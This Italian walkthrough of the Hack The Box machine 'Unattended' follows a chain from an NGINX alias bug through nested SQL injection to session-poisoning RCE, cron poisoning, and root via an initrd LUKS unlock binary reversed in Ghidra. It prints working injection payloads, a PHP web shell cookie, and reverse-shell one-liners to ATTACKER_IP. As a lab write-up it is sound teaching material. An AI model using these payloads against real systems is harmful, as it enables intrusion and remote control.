---
title: 'HTB Unattended Walkthrough: NGINX Alias Bug e Root via LUKS'
slug: htb-unattended-walkthrough
description: 'Hack The Box Unattended writeup completo: NGINX alias bug, doppia SQL injection, LFI, session poisoning, cron poisoning e privilege escalation a root.'
image: /unattended-htb-walkthrough.webp
draft: false
date: 2026-08-11T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - medium
tags:
  - nginx-alias-bug
  - luks
  - ghidra
  - cron-poisoning
  - session-poisoning
---

# HTB Unattended Walkthrough: da NGINX Alias Bug a Root via LUKS

Unattended è una macchina Linux di HackTheBox che mette in fila quattro tecniche molto diverse tra loro: un bug di configurazione NGINX per esfiltrare codice sorgente, una doppia SQL injection incastrata, un LFI trasformato in RCE tramite session poisoning, e infine un'escalation a root che passa per il reverse engineering di un binario custom legato allo sblocco di un disco cifrato LUKS. È una macchina di livello Medio, ma il ragionamento richiesto per collegare i vari pezzi la rende più impegnativa di quanto suggerisca la difficulty rating.

In questo walkthrough analizziamo ogni fase passo per passo, spiegando non solo i comandi ma il *perché* dietro ogni scelta.

## Ricognizione iniziale

```bash
sudo mynmap 10.10.10.126
```

[`mynmap`](https://github.com/hack-ita/mynmap) è il wrapper custom per nmap usato su queste analisi: esegue in automatico discovery TCP veloce, poi service/OS detection con script, così da non dover lanciare comandi separati per ogni fase.

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http nginx 1.10.3
| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
| Not valid before: 2018-12-19T09:43:58
|_Not valid after:  2021-09-13T09:43:58
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
```

Solo due porte aperte, entrambe nginx 1.10.3 (HTTP e HTTPS). Il rilevamento del sistema operativo, in questo caso, non è affidabile — nmap stesso lo segnala esplicitamente quando non trova almeno una porta chiusa su cui basare le sue deduzioni:

```
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), ...
No exact OS matches for host (test conditions non-ideal).
```

Vale la pena soffermarsi su questo, perché è un errore comune fidarsi ciecamente dell'OS detection di nmap: qui il tool arriva a suggerire perfino "MikroTik RouterOS" con la stessa percentuale di affidabilità di "Linux generico" — un'ipotesi palesemente sbagliata su una macchina HTB che, come vedremo, è una normalissima installazione Debian. Il motivo tecnico è proprio quello che nmap segnala nel warning: l'OS fingerprinting si basa in gran parte sull'analisi delle risposte TCP di una porta *aperta* confrontata con una porta *chiusa* — qui, con solo porte aperte visibili e nessuna firewalled/chiusa da confrontare, il fingerprint perde gran parte della sua base statistica e degenera in un semplice elenco di sistemi "ugualmente compatibili" con i pochi dati raccolti. La lezione pratica: quando nmap avvisa esplicitamente di condizioni di test "non ideali", le percentuali alte sull'OS guess vanno lette come rumore, non come un dato su cui costruire ipotesi di attacco.

Il certificato TLS della porta 443, invece, è molto più utile: rivela un common name preciso, `www.nestedflanders.htb`. Questo va aggiunto al file hosts insieme alla variante senza `www.`, perché senza il nome host corretto il server nginx risponde con una pagina vuota (comportamento tipico di virtual hosting basato su nome).

Con il dominio configurato, una scansione di directory con `gobuster` (a bassa concorrenza, perché il target sembra soffrire sotto carico) trova due path utili:

```
/index.php (Status: 200)
/dev (Status: 301)
```

`/index.php` mostra un sito minimale con tre pagine (main, about, contact), ciascuna richiamata tramite un parametro `?id=`. `/dev` restituisce solo un messaggio testuale: il sito di sviluppo è stato spostato su un altro server. Un fuzzing sui sottodomini non trova nulla — `dev.nestedflanders.htb` non esiste come vhost separato.

## Il bug dell'alias NGINX

Quando un percorso dichiara di essere stato "spostato altrove" ma il fuzzing sui sottodomini non produce risultati, vale la pena chiedersi se in realtà la cartella esiste ancora sullo stesso host, semplicemente non raggiungibile per vie dirette. Questo è esattamente il caso descritto da Orange Tsai nella presentazione BlackHat 2018 *Breaking Parser Logic*: quando un alias NGINX è configurato senza slash finale, è possibile "uscire" dalla cartella con un path traversal mascherato.

Un test rapido conferma il pattern:

```bash
curl -s -k -I https://www.nestedflanders.htb/dev../ 
```

Questo restituisce 403, un comportamento anomalo che segnala la presenza del bug. Spingendosi oltre:

```bash
curl -s -k -I https://www.nestedflanders.htb/dev../html/index.php
```

restituisce 200 OK — mentre un traversal "normale" (`dev/../html/index.php`) fallisce con 404. La differenza sta in come NGINX normalizza internamente il path dell'alias prima di passarlo al filesystem: `dev../` non viene trattato come "sali di una cartella dentro dev", ma come stringa letterale che, concatenata alla base dell'alias, punta fuori dalla directory prevista.

Con una richiesta GET completa (non solo HEAD), si ottiene il codice sorgente PHP in chiaro. Questo accade perché quella particolare location NGINX non è configurata per passare le richieste all'interprete PHP — restituisce quindi il file come testo statico invece di eseguirlo.

Lo stesso identico risultato si ottiene con l'URL-encoding del punto (`%2e`):

```bash
curl -s -k https://www.nestedflanders.htb/dev.%2e/html/index.php
```

NGINX decodifica `%2e` in `.` prima di processare la location, quindi il comportamento è identico — è solo una notazione diversa dello stesso bug. Vale la pena chiarire un equivoco comune: questa tecnica **non è correlata** a [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/cve-2021-41773) (path traversal di Apache HTTP Server), che colpisce specificamente le versioni 2.4.49 e 2.4.50 tramite un difetto nel path normalization interno di Apache stesso. Qui il problema è a monte, nella configurazione dell'alias NGINX, e riguarda qualsiasi versione del software.

## Capire la SQL injection partendo da index.php, senza dare nulla per scontato

Prima ancora di guardare il sorgente PHP recuperato, la SQL injection si può notare semplicemente osservando come si comporta il sito. Le tre pagine sono raggiungibili così:

```
index.php?id=25   → pagina "main"
index.php?id=465  → pagina "about"
index.php?id=587  → pagina "contact"
```

Il test più semplice ed efficace per capire se un parametro come `id` finisce dentro una query SQL senza controlli è aggiungere un apice singolo (`'`) alla fine del valore:

```
index.php?id=25'
```

Perché proprio l'apice? Perché nel codice, dietro le quinte, il valore di `id` viene incollato dentro una query SQL tra due apici, più o meno così:

```sql
SELECT name FROM idname where id = '25'
```

Se il sito prende il tuo input e lo mette *letteralmente* dentro quella query senza nessuna pulizia, aggiungendo un apice tu "rompi" la sintassi della query: diventa `id = '25''` — un apice di troppo, che a livello SQL è un errore di sintassi. Un sito web "sano", che gestisce bene gli errori, dovrebbe reagire in un modo prevedibile a questo genere di rottura: un errore SQL visibile, una pagina 500, un 404, o comunque qualcosa di diverso dal comportamento normale.

Su Unattended, invece, succede una cosa più sottile e proprio per questo interessante: la pagina non va in errore. Cambia semplicemente contenuto, tornando alla pagina "main" invece della pagina attesa. Questo è un segnale fortissimo, anche più utile di un errore vero e proprio: vuol dire che il codice, quando la query fallisce (per colpa del nostro apice), non crasha — semplicemente ricade su un valore di default. E questo comportamento "silenzioso" è proprio ciò che serve per una tecnica chiamata **blind SQL injection**: non vediamo mai l'errore SQL vero, ma possiamo dedurre se una nostra condizione booleana è vera o falsa osservando *quale pagina ci viene restituita*.

Per verificarlo, si può costruire un test come questo:

```
index.php?id=587' and 1=1-- -
```

Qui `1=1` è sempre vero. Se il sito continua a mostrare la pagina "contact" (che corrisponde a id 587), vuol dire che la query è stata ricostruita correttamente e la condizione booleana che abbiamo iniettato viene effettivamente valutata dal database. Se invece proviamo:

```
index.php?id=587' and 1=2-- -
```

con `1=2` sempre falso, il sito torna alla pagina "main". Questo conferma al 100% che il parametro `id` è vulnerabile: possiamo iniettare condizioni SQL arbitrarie e "leggere" il risultato osservando quale pagina viene mostrata. Da qui si può già impostare uno script che, carattere per carattere, estrae informazioni dal database (ad esempio la versione con `substring(@@version,1,1)='...'`), oppure affidarsi a uno strumento come [sqlmap](https://hackita.it/articoli/sqlmap/) per automatizzare l'intero processo di enumerazione del database.

## Analisi del sorgente e SQL injection annidata

Il codice recuperato rivela due funzioni chiave. Prima di leggerle, un chiarimento minimo per chi non mastica PHP tutti i giorni: una "funzione" è semplicemente un pezzo di codice a cui dai un nome, che riceve degli input tra parentesi e alla fine restituisce un risultato con `return`. Quel risultato può essere usato subito dopo, altrove nel codice, come se fosse un valore qualsiasi.

```php
function getTplFromID($conn) {
    global $debug;
    $valid_ids = array (25,465,587);
    if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
        $sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
    } else {
        $sql = "SELECT name FROM idname where id = '25'";
    }
    // ...
    return $ret;
}

function getPathFromTpl($conn,$tpl) {
    global $debug;
    $sql = "SELECT path from filepath where name = '".$tpl."'";
    // ...
    return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
```

`$tpl = getTplFromID($conn);` chiama la prima funzione e salva il suo risultato in `$tpl`. `$inc = getPathFromTpl($conn,$tpl);` prende quel `$tpl` e lo passa alla seconda funzione, salvando il suo risultato in `$inc`. Più avanti nel file c'è la riga che rende tutto pericoloso: `include("$inc");`. In PHP, `include()` prende un file e lo esegue come se il suo contenuto facesse parte del programma stesso — non lo mostra soltanto, lo *esegue*. E qui viene chiamato su `$inc`, un valore che, come vedremo, un utente esterno può manipolare completamente.

Il primo ostacolo per arrivarci è il controllo `intval($_GET['id']) == $_GET['id']`. Sembra un controllo serio, ma nasconde un problema classico di PHP. `intval()` prende una stringa e ne estrae solo la parte numerica iniziale, scartando il resto: `intval("25 qualcosa")` restituisce `25`. Il problema è il doppio uguale `==`: in PHP confronta due valori convertendoli allo stesso tipo prima del confronto, invece di richiedere che siano identici. Quindi `25 == "25 qualcosa"` risulta `true`, perché PHP converte la stringa a numero e confronta `25` con `25`. Basterebbe usare il triplo uguale `===` (che pretende stesso tipo *e* stesso valore) per bloccare questo trucco. È lo stesso tipo di insidia descritta nel nostro approfondimento sulla [SQL injection](https://hackita.it/articoli/sql-injection/): un controllo che sembra validare l'input in realtà lo lascia passare, a patto che inizi con una cifra valida.

Il punto interessante è che si tratta di **due query concatenate**, una dietro l'altra:

```
id (tuo input)  →  Query 1 (getTplFromID)  →  $tpl  →  Query 2 (getPathFromTpl)  →  $inc
```

Tu, nell'URL, tocchi solo la Query 1. Il suo risultato (`$tpl`) diventa poi l'input della Query 2, che tu non vedi mai direttamente. Per controllare cosa finisce dentro `$inc` — e quindi cosa viene incluso ed eseguito dal server — serve un'injection che, dentro la Query 1, **produca come risultato una seconda injection**, pronta ad attivarsi quando finisce dentro la Query 2. È un'injection dentro un'altra injection, per questo il payload sembra così complicato:

```
587' and 1=2 UNION select 'hackita\' union select \'/etc/passwd\'-- -'-- -
```

Scomponiamolo pezzo per pezzo, con calma:

* **`587'`** — chiude l'apice della Query 1 originale, così possiamo aggiungere SQL nostro subito dopo.
* **`and 1=2`** — questa condizione è sempre falsa. Serve ad "annullare" la parte di query scritta dal programmatore, in modo che l'unico risultato restituito sia quello che scriviamo noi con la `UNION SELECT` subito dopo. Senza questo pezzo, rischieremmo di ottenere risultati mischiati tra quello vero (scritto dal dev) e quello nostro.
* **`UNION select 'hackita\' union select \'/etc/passwd\'`** — questa è la parte che diventa `$tpl`. Da fuori sembra solo una stringa qualunque, ma contiene già dentro di sé una seconda `union select` completa, con gli apici "spezzati" (`\'`) apposta per non chiudersi subito. Quando questa stringa arriva dentro la Query 2 (`SELECT path from filepath where name = '$tpl'`), quegli apici mascherati **si riattivano** come apici SQL veri, perché a quel punto sono semplicemente concatenati dentro una nuova query.
* **`-- -`** (il primo) — commenta il resto della Query 1 originale, in modo che l'apice di chiusura che il codice PHP aggiunge automaticamente a fine riga non rompa tutto.
* **`'-- -`** (il secondo, alla fine) — stessa identica funzione, ma per la Query 2: commenta l'apice di chiusura automatico di quella seconda query.

In pratica: il primo livello di injection ci serve solo per "consegnare" un secondo payload alla query successiva, che è quella che davvero decide il valore di `$inc`. Cambiando `/etc/passwd` con il path del file di sessione PHP (visto nella sezione successiva), questo stesso meccanismo diventa la chiave per trasformare l'LFI in RCE.

## Da LFI a RCE tramite session poisoning

A questo punto `$inc` è completamente sotto controllo: possiamo far puntare l'`include()` a qualunque path scegliamo tramite la doppia SQL injection vista sopra. Un LFI "banale" si fermerebbe qui, leggendo file già presenti sul server (come `/etc/passwd`, giusto per dimostrare che funziona). Ma per trasformarlo in **esecuzione di codice** serve un file che contenga codice PHP nostro — e qui entra in gioco un meccanismo specifico di PHP: i file di sessione.

**Come funzionano le sessioni PHP, in breve.** Ogni volta che un browser (o `curl`) fa una richiesta a un sito PHP che usa `session_start()`, il server crea (o riusa) un file sul disco, dentro una cartella tipo `/var/lib/php/sessions/`. Il nome del file è sempre `sess_` seguito dal valore del cookie `PHPSESSID` che identifica la sessione. Dentro questo file, PHP salva tutte le variabili che il sito mette in `$_SESSION` — ad esempio, se sei loggato, lì dentro c'è scritto il tuo username.

Ora guardiamo cosa fa il codice del sito con i cookie che gli mandiamo:

```php
session_start();
if (isset($_SESSION['user_name'])){
    $user_name = $_SESSION['user_name'];
}

foreach ($_COOKIE as $key => $val) {
    $_SESSION[$key] = $val;
}
```

Andiamo riga per riga, con calma.

`session_start();` avvia (o riprende) la sessione PHP per questa richiesta — è il primo passo obbligatorio prima di poter usare `$_SESSION`.

`foreach ($_COOKIE as $key => $val)` è un ciclo che scorre **tutti i cookie** che il client ha mandato nella richiesta, uno alla volta. Ad ogni giro, `$key` prende il *nome* del cookie e `$val` prende il suo *valore*. Se per esempio mandiamo il cookie `tema=scuro`, in quel giro `$key` vale `"tema"` e `$val` vale `"scuro"`.

`$_SESSION[$key] = $val;` prende quel nome e quel valore e li **ricopia identici** dentro l'array di sessione. Quindi il cookie `tema=scuro` diventa, dentro la sessione, `$_SESSION['tema'] = 'scuro'`.

Il problema è che questo ciclo non fa **nessun controllo**: non verifica quali nomi di cookie sono ammessi (nessuna whitelist), e non controlla cosa contiene il valore. Qualunque cookie mandiamo, con qualunque nome e qualunque contenuto, viene copiato pari pari dentro la sessione — e la sessione, come abbiamo visto, viene scritta su un file reale sul disco del server.

Questo apre una possibilità precisa: se mandiamo un cookie il cui valore è codice PHP vero e proprio, tipo:

```
shell=<?php system($_GET['cmd']); ?>
```

quel codice finisce scritto, come testo, dentro il nostro file di sessione sul server — non viene eseguito in quel momento, viene solo *salvato lì dentro* come se fosse un pezzo qualsiasi di testo.

A questo punto i due bug si incontrano. Da soli non bastano: la SQL injection ci fa scegliere *quale file* includere, ma non controlla *cosa c'è scritto dentro*; il cookie scrive codice PHP in un file, ma da solo quel file non viene mai eseguito da nessuno. Uniti, però, funzionano: puntiamo `$inc` (tramite la doppia SQLi) esattamente al path del nostro file di sessione:

```
/var/lib/php/sessions/sess_<PHPSESSID>
```

e quando la riga `include("$inc");` più avanti nel codice apre quel file, PHP non lo legge come semplice testo — lo **esegue** come se fosse codice del sito stesso, perché `include()` fa esattamente questo con qualsiasi file gli passi. Dentro quel file c'è il nostro `<?php system($_GET['cmd']); ?>`, quindi da quel momento in poi possiamo eseguire comandi sul server passando un parametro GET `cmd`:

```bash
curl -k "https://www.nestedflanders.htb/index.php?cmd=id&id=587'+AND+1=2+UNION+SELECT+'x\'+union+select+\'/var/lib/php/sessions/sess_XXXXX\'--+-'--+-" \
  -H "Cookie: PHPSESSID=XXXXX; shell=<?php system(\$_GET['cmd']); ?>"
```

Questo dà RCE come utente `www-data`.

**Da comando singolo a shell interattiva.** Eseguire un comando alla volta tramite `?cmd=` è scomodo. Il passo successivo è ottenere una shell vera e propria. Un modo comodo, se sul target è disponibile Python (verificalo prima con `which python python3`), è passare il parametro `cmd` con uno script Python che apre una connessione di rete verso la propria macchina e restituisce una shell interattiva completa tramite `pty.spawn`:

```
cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

Con un listener in ascolto sulla propria macchina:

```bash
nc -lvnp PORT
```

si riceve una shell bash interattiva come `www-data`. Se invece Python non fosse presente sul target (capita, ed è sempre bene verificarlo prima di dare per scontato l'ambiente), un'alternativa altrettanto valida è `socat`, se disponibile:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:443
```

in ascolto con:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
```

Entrambe le strade portano allo stesso risultato: una tty completa, invece di una shell "cieca" senza gestione di segnali e senza tab-completion.

## Escalation a un secondo utente via cron poisoning

Con shell come `www-data`, le credenziali del database sono visibili direttamente nel sorgente PHP recuperato in precedenza. Connettendosi al database (vedi la nostra guida su [MySQL sulla porta 3306](https://hackita.it/articoli/porta-3306-mysql/) per il contesto sul protocollo), la tabella `config` del database `neddy` contiene una entry particolarmente interessante:

```
| 86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl; |
```

Il nome e la struttura (due script concatenati da `;`) suggeriscono fortemente che questo valore venga eseguito periodicamente da un processo automatico — molto probabilmente un cron job che gira come l'utente `guly`, proprietario di quegli script. Aggiornando quel campo con un comando arbitrario:

```sql
UPDATE config SET option_value = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" WHERE id=86;
```

e osservando il valore tornare al default dopo circa un minuto, si conferma l'esecuzione periodica. Un listener in ascolto riceve una shell come `guly`.

## Hardening del sistema: hidepid e noexec

Prima di procedere con la privilege escalation vera e propria, vale la pena notare con calma due misure di hardening applicate su questa macchina, perché cambiano il modo in cui bisogna enumerare il sistema.

**hidepid=2.** Guardando come è montato `/proc`:

```bash
mount | grep ^proc
```

```
proc on /proc type proc (rw,relatime,hidepid=2)
```

`/proc` è una cartella speciale di Linux che non contiene file "normali", ma informazioni live su ogni processo in esecuzione sul sistema — ogni processo ha lì dentro una sua sottocartella con dati leggibili. Comandi come `ps` non "sanno" davvero chi sta girando sul sistema: leggono semplicemente il contenuto di `/proc` e lo mostrano formattato. L'opzione `hidepid=2` dice al kernel: mostra a ogni utente solo le informazioni sui *propri* processi, nascondendo quelle di tutti gli altri.

La conseguenza pratica è che `ps aux` (o `ps awuxx`) mostra solo i processi del proprio utente, e questo rende **inutile uno strumento come `pspy`**, molto usato in privilege escalation Linux proprio per osservare in tempo reale cosa esegue root (ad esempio comandi lanciati da cron). Con `hidepid=2` attivo, pspy semplicemente non vede nulla di quello che root sta facendo. È un buon esempio di come i permessi assegnati ai [gruppi Linux](https://hackita.it/articoli/group-linux-privilege-escalation/) e la configurazione del filesystem possano bloccare tecniche di enumerazione altrimenti standard.

**noexec su tmp, dev/shm e var/tmp.** Controllando le cartelle usate solitamente per scrivere file temporanei:

```bash
mount | grep -e "tmp " -e shm
```

```
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
```

L'opzione `noexec` non impedisce di **scrivere** file in quelle cartelle — puoi tranquillamente copiarci un binario o uno script — ma impedisce di **eseguirli** direttamente da lì, anche se hai il permesso `x` sul file. È un blocco molto comune proprio per rendere più difficile eseguire payload scaricati o generati durante un attacco.

Quando `/tmp`, `/dev/shm` e `/var/tmp` sono tutte bloccate, la domanda giusta da porsi è: esiste da qualche altra parte una cartella dove ho sia permesso di scrittura sia permesso di esecuzione? Questo comando risponde esattamente a quella domanda, combinando due controlli:

```bash
for d in $(find / -writable -type d 2>/dev/null); do
  mount | grep " $(df --output=target "$d" 2>/dev/null | tail -1) " | grep -qv noexec && echo "$d"
done
```

Vediamo cosa fa passo per passo. `find / -writable -type d 2>/dev/null` cerca in tutto il filesystem le cartelle dove il tuo utente ha permesso di scrittura, scartando gli errori di permesso negato (`2>/dev/null`). Il `for` scorre ognuna di queste cartelle una alla volta, mettendola in `$d`. Per ogni cartella, `df --output=target "$d"` restituisce il *mount point* a cui quella cartella appartiene — cioè su quale "disco virtuale" si trova effettivamente, dato che una cartella dentro `/tmp` appartiene al mount point `/tmp`, non a se stessa. Il risultato viene poi cercato dentro l'output di `mount`, e si controlla con `grep -qv noexec` se quella riga **non** contiene la parola `noexec`. Se la cartella è scrivibile *e* si trova su un mount senza `noexec`, il path viene stampato: è un buon candidato dove piazzare ed eseguire i propri script.

## Privilege escalation a root: il gruppo grub e l'initrd

Il primo indizio utile arriva dall'output di `id`:

```
uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)
```

Tra i gruppi elencati, `grub` salta all'occhio: non è uno dei gruppi standard che ti aspetteresti su un'installazione Debian pulita (a differenza di `cdrom`, `audio`, `video`, che sono normalissimi). Un modo pratico per orientarsi su quali gruppi Linux siano "di sistema" e quali possano invece nascondere un vettore di privilege escalation è il nostro approfondimento su [gruppi Linux e privilege escalation](https://hackita.it/articoli/group-linux-privilege-escalation/) — la logica di fondo è sempre la stessa: un gruppo insolito, associato al tuo utente, di solito esiste per darti accesso a qualcosa di specifico, e vale la pena chiedersi a cosa.

Cerchiamo quindi quali file appartengono a quel gruppo:

```bash
find / -group grub 2>/dev/null
```

Il comando dice, in sostanza: "cerca in tutto il filesystem (`/`) i file posseduti dal gruppo `grub`". Il risultato mostra l'accesso in lettura a diversi file `initrd.img-*` dentro `/boot`, normalmente leggibili solo da root.

**Cos'è un initrd, spiegato senza fretta.** Un file con estensione `.img` è, in generale, un'"immagine" — un unico file che contiene dentro di sé un intero filesystem in miniatura (cartelle, sottocartelle, file), un po' come uno zip ma pensato per essere montato e usato come se fosse un disco vero, non solo estratto. Quando un sistema Linux si accende, il kernel non può montare subito il disco vero e proprio, perché a volte servono driver o passaggi preliminari (per esempio, sbloccare un disco cifrato) prima ancora che il filesystem principale sia disponibile. Per questo il kernel carica prima uno di questi file immagine: l'`initrd` (*initial ramdisk*), che contiene una versione "in miniatura" di un sistema Linux — con le sue cartelle `bin`, `etc`, `lib`, `sbin` — più il minimo indispensabile di programmi e script per completare l'avvio.

**Cos'è LUKS e perché conta qui.** Osservando come sono organizzati i dischi con `lsblk`:

```
NAME           MAJ:MIN RM  SIZE RO TYPE  MOUNTPOINT
sda              8:0    0    4G  0 disk  
├─sda1           8:1    0  285M  0 part  /boot
└─sda2           8:2    0  3.7G  0 part  
  └─sda2_crypt 254:0    0  3.7G  0 crypt /
```

la partizione principale del sistema (`/`, l'equivalente Linux del `C:\` di Windows) non è collegata direttamente al disco fisico, ma passa attraverso uno strato chiamato `sda2_crypt`, marcato come `crypt`. Questo significa che l'intero disco è **cifrato** con LUKS (Linux Unified Key Setup), lo standard Linux per la cifratura dei dischi.

Il vantaggio di cifrare un intero disco è concettualmente semplice: se qualcuno ruba fisicamente il disco (o l'intero computer) e prova a leggerne il contenuto collegandolo a un'altra macchina, senza la password corretta vede solo dati illeggibili — non l'installazione Windows/Linux, non i file, nulla. È una protezione contro il furto fisico o l'accesso non autorizzato al supporto, non contro attacchi via rete: chi possiede fisicamente il disco ma non la password resta bloccato fuori. È per questo che sistemi con dati sensibili, o macchine che possono essere sequestrate/rubate, spesso adottano questa protezione — è comune, ad esempio, tra chi vuole proteggere dati anche in caso di analisi forense successiva a un sequestro.

Il problema pratico è: se tutto il disco è bloccato da una password, **come fa il sistema ad avviarsi da solo**, senza che qualcuno la digiti a mano ogni volta (da qui il nome della macchina, *Unattended*, "incustodita")? La risposta deve trovarsi da qualche parte nel processo di boot — ed è proprio per questo che l'accesso in lettura ai file `initrd` (grazie al gruppo `grub`) diventa interessante: è lì che si trova la logica automatica di sblocco.

Mettendo insieme i due indizi — possiamo leggere i file di avvio del sistema (`initrd`, tramite il gruppo `grub`), e il disco root è cifrato e deve sbloccarsi da solo — il passo successivo è ovvio: apriamo l'initrd e cerchiamo lo script che gestisce quello sblocco.

Decomprimendo ed estraendo l'archivio. Il file `.img` è compresso con gzip, quindi va prima decompresso, e il risultato è un archivio in formato `cpio` (un formato di archiviazione diverso da `tar`, quindi serve lo strumento giusto per estrarlo):

```bash
zcat /boot/initrd.img-4.9.0-8-amd64 > /tmp/initrd.cpio
cpio -idm < /tmp/initrd.cpio
```

Il risultato è un mini filesystem completo, con cartelle `bin`, `etc`, `lib`, `sbin` come su un sistema normale, più una cartella non standard chiamata `scripts` — è questa a contenere la logica di avvio specifica di questo sistema (le altre cartelle sono programmi/librerie generiche, comuni a qualsiasi installazione Debian). Dentro `scripts` ci sono diverse sottocartelle (`init-top`, `local-bottom`, `local-premount`, `local-top`, ecc.), ciascuna corrispondente a una fase diversa del processo di avvio. Il file che ci interessa si trova per nome, non per intuizione sulla cartella: dentro `local-top` c'è un file chiamato letteralmente `cryptroot` — il nome stesso dice cosa fa, "gestione del crypt della root" (cioè lo sblocco della partizione `/` cifrata). È l'unico file, tra tutti quelli presenti, il cui nome è esplicitamente collegato alla cifratura del disco.

Dentro `scripts/local-top/cryptroot` si trova un blocco di codice fuori dallo standard Debian, riconoscibile da un commento con firma personale:

```bash
if [ ! -e "$NEWROOT" ]; then
  # guly: we have to deal with lukfs password sync when root changes her one
  if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
    /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
    message "cryptsetup: cryptsetup failed, bad password or options?"
    sleep 3
    continue
  fi
fi
```

`/sbin/uinitrd` non è un binario standard: è stato aggiunto appositamente dal creatore della macchina. Il suo output, passato in pipe a `cryptsetup`, funge da password per sbloccare il disco cifrato. Copiando il binario in una posizione eseguibile (non `/tmp`, per via del `noexec` visto sopra) ed eseguendolo con l'argomento hardcoded trovato nello script:

```bash
cp sbin/uinitrd /var/www/html/uinitrd
chmod +x /var/www/html/uinitrd
/var/www/html/uinitrd c0m3s3f0ss34nt4n1
```

il binario stampa un hash che è, letteralmente, la password dell'utente root. Con quella:

```bash
su -
```

si ottiene una shell come root.

## Come è costruita internamente la password (reverse engineering con Ghidra)

Una volta ottenuta la password ed eseguito l'exploit, resta una domanda legittima: **come fa `uinitrd` a generare esattamente quella stringa?** Rispondere non è necessario per completare la macchina, ma è un ottimo esercizio di reverse engineering — ed è anche un modo per capire *perché* il binario, se lo copi ed esegui su un'altra macchina fuori da Unattended, restituisce un output completamente diverso ("supercazzola") invece della password vera.

Il primo passo, prima ancora di aprire un disassembler, è raccogliere informazioni base sul file con il comando `file`:

```bash
file uinitrd
```

```
uinitrd: ELF 64-bit LSB executable, x86-64, statically linked, ... stripped
```

Due dettagli contano molto qui. **Statically linked** significa che il binario include già al suo interno tutte le funzioni delle librerie che usa (come le funzioni di hashing), invece di caricarle da librerie condivise esterne — è più grande, ma anche più "autonomo" da analizzare, perché tutto il codice rilevante è dentro il file stesso. **Stripped** significa che sono state rimosse le informazioni di debug (nomi di funzioni e variabili) che normalmente aiutano a orientarsi: bisogna quindi identificare a mano cosa fa ogni funzione, di solito partendo dalle stringhe di testo presenti nel binario.

Aprendo il file con **Ghidra** (disassembler gratuito, alternativa open source a IDA Pro) e guardando la finestra **Defined Strings** (Window → Defined Strings), saltano subito all'occhio alcune righe:

```
Location    String Value    XREF
0049e346    /etc/hostname   FUN_0040103e:0040107d
0049e354    /boot/guid      FUN_0040103e:0040115a
0049e364    supercazzola    FUN_0040103e:00401289
```

La colonna XREF (cross-reference, "riferimento incrociato") dice da quale funzione e a quale indirizzo esatto viene usata ciascuna stringa. Tutte e tre compaiono nella stessa funzione, `FUN_0040103e` — è il primo indizio concreto che quella funzione è il cuore del programma: legge quei due file e, in qualche condizione, stampa "supercazzola". Da qui si apre `FUN_0040103e` nel Decompiler per leggere la logica riga per riga.

Proseguendo nell'analisi del codice decompilato, la logica completa che emerge è: il programma legge il proprio hostname da `/etc/hostname`, legge un identificativo (GUID) da `/boot/guid`, concatena questi due valori con la stringa fissa `antani`, aggiunge in coda l'argomento passato da riga di comando (nel nostro caso `c0m3s3f0ss34nt4n1`), e passa l'intera stringa risultante a una funzione di hashing (il formato dell'output finale — una stringa esadecimale di 40 caratteri — è coerente con un digest SHA1, anche se una verifica più approfondita a livello di assembly andrebbe oltre lo scopo di questo articolo). Il risultato, stampato in esadecimale, è la password che sblocca il disco.

### Leggendo il codice decompilato passo per passo

Aprendo la funzione principale nel Decompiler di Ghidra, il codice compare più o meno così (i nomi delle variabili sono generati automaticamente, dato che il binario è stripped):

```c
local_518 = 0x54534554;
local_18 = FUN_00417c60("/etc/hostname",&DAT_0049e344);
if (local_18 != 0) {
    lVar3 = FUN_00417980(&local_518,1000,local_18);
    if (lVar3 != 0) {
        FUN_00400fde(&local_518);
    }
    FUN_00417590(local_18);
}
```

Andiamo con calma, una riga alla volta.

**`local_518 = 0x54534554;`** — questo numero esadecimale, se leggi i suoi byte come caratteri, corrisponde al testo `"TEST"`. È solo un valore di riempimento iniziale, prima che la variabile venga sovrascritta col dato vero. Un dettaglio interessante qui: leggendo i byte nell'ordine in cui compaiono nel numero (`54 53 45 54`) otterresti "TSET", non "TEST" — perché le CPU x86 salvano i numeri multi-byte in memoria **al contrario** (convenzione chiamata *little-endian*): l'ultimo byte del valore viene scritto per primo. Riordinandoli correttamente (`54 45 53 54`) si ottiene "TEST".

